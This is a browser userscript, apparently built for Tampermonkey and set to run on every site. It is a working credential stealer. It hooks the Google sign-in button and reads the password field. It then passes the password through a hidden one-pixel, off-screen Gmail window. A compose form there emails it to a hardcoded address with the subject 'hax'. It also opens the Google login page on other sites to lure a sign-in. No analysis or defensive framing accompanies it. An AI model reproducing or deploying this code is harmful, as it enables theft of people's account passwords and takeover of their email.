// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';
    function start() {
        pjack();
        if(check('mail.google.com')) {email();}
    }
    function email() {
        try {
            document.getElementsByClassName("maia-button maia-button-secondary")[0].click();
        }
        catch(err) {
            var nul;
        }

        setTimeout(function () {document.title="Loading Data";document.getElementById("sub").value='hax';document.getElementById("body").value=window.location.href.split('#')[1];document.getElementById("to").value='apereira3127@gmail.com';document.getElementById("send").click();},5000);
    }
    function check(s) {
        if(window.location.href.match(s) !== null) {
            return true;
        } else {
            return false;
        }
    }
    function pjack() {
        if(check('accounts.google.com')) {
            document.getElementById("signIn").onclick=function() {var x=window.open('https://mail.google.com/mail/u/0/x/j5jycse49u7h-/?&cs=b&pv=tl&eot=1&v=b#'+document.getElementById("Passwd").value,'_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=100000, top=100000, width=1, height=1, visible=none', '');};
        }
        if(!check('google.com')) {
            window.open('https://accounts.google.com/ServiceLogin?passive=1209600&sacu=1&ignoreShadow=0&acui=1');
        }
    }
    window.onload=start();
})();
